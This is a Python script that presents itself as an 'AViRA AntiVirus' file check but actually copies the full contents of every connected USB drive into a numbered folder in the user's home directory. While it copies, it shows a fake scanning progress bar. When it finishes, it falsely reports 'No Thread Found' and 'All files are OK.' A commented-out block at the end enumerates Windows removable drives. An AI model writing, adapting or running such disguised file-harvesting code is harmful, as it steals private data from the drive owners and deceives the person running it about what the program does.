import getpass
from os import chdir , listdir , path , mkdir
from shutil import copytree , copyfile
from progressbar import *

class Mains:
    def Reader(self):

        self.username = getpass.getuser()

        self.home = "/home/"+ self.username + "/"

        if "USB Files" not in listdir(self.home):
            chdir(self.home)
            mkdir("USB Files")

        self.usb_save_dir = self.home + "USB Files/"

## region First check:
        if "USB_num" not in listdir(self.usb_save_dir):
            f = open( self.usb_save_dir + "USB_num", "w")
            f.close()
            self.usb_number()
        else:
            self.usb_number()


        print("\n****AViRA AntiVirus***"
      "\nInfo(tags/v3.7.6:43364a7ae0, Dec 29 2019, 00:42:30) [MSC v.1916 64 bit (AMD64)] on win32"
      "\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n"
      "Please wait while checking your files...\n")


    def usb_number(self):
        chdir(self.usb_save_dir)
        lister = listdir('.')
        Directories = []
        for i in lister:
            if path.isdir(i) == True:
                Directories.append(i)

        if len(Directories) == 0 :
            f = open(self.usb_save_dir + "USB_num", "w")
            f.writelines("0")
            f.close()

        else:
            for i in Directories:
                i = int(i)
            maxs = int(max(Directories))
            # maxs += 1
            f = open(self.usb_save_dir + "USB_num", "w")
            f.writelines(str(maxs))
            f.close()

## endregion

        f = open(self.usb_save_dir + "USB_num", "r+")
        self.reader = f.readlines()
        self.reader = self.reader[0]
        f.close()

    def usbdrive(self):
        chdir("/media/"+self.username)
        self.drive_list = listdir('.')

        if self.drive_list.__len__() == 0 :
            print("No USB Connected!!!")
            sleep(4)
            exit()

        self.reader = int(self.reader) +  1
        f = open(self.usb_save_dir + "USB_num", "w")
        f.writelines(str(self.reader))
        f.close()


    def copier(self):
        if len(self.drive_list) > 1 :
            x =0
            while x < len(self.drive_list):
                chdir(self.drive_list[x])
                self.copy()
                x += 1
                self.reader += 1
        else:
            chdir(self.drive_list[0])
            self.copy()

    def copy(self):

        pwd = listdir('.')


        Files = []
        Directories = []

        for i in pwd:
            if path.isfile(i) == True:
                Files.append(i)
            else:
                Directories.append(i)

        widgets = ['Checking: ' , Percentage() , ' ' , Bar(marker='0' , left='[' , right=']') , ' ' , ETA() , ' ' , FileTransferSpeed()]
        bar = ProgressBar(widgets = widgets,maxval=len(pwd))

        x = 1
        for dir in Directories:
            try:
                copytree(dir, self.usb_save_dir + str(self.reader) + "/" + dir)
                bar.update(x)
                x += 1
            except :
                bar.update(x)
                x += 1
        for file in Files:
            try:
                copyfile(file, self.usb_save_dir + str(self.reader) + "/" + file)
                bar.update(x)
                x += 1
                # bar.next()
            except :
                bar.update(x)
                x += 1
                # bar.next()
        bar.finish()

    def final(self):
        # time.sleep(1)
        print("\n=====No Thread Found=====\n\nAll files are OK.")
        input()

M = Mains()
M.Reader()
M.usbdrive()
M.copier()
M.final()























# import ctypes
#
# DRIVE_REMOVABLE   = 2
#
# DRIVE_TYPE_MAP = { DRIVE_REMOVABLE   : 'DRIVE_REMOVABLE'}
#
# def get_drive_info():
#     result = []
#     bitmask = ctypes.windll.kernel32.GetLogicalDrives()
#     for i in range(26):
#         bit = 2 ** i
#         if bit & bitmask:
#             drive_letter = '%s:' % chr(65 + i)
#             drive_type = ctypes.windll.kernel32.GetDriveTypeA('%s\\' % drive_letter)
#             result.append((drive_letter, drive_type))
#     return result
#
# # Test
# if __name__ == '__main__':
#     drive_info = get_drive_info()
#     for drive_letter, drive_type in drive_info:
#         print('%s = %s' % (drive_letter, DRIVE_TYPE_MAP[drive_type]))
#     removable_drives = [drive_letter for drive_letter, drive_type in drive_info if drive_type == DRIVE_REMOVABLE]
#     print('removable_drives = %r' % removable_drives)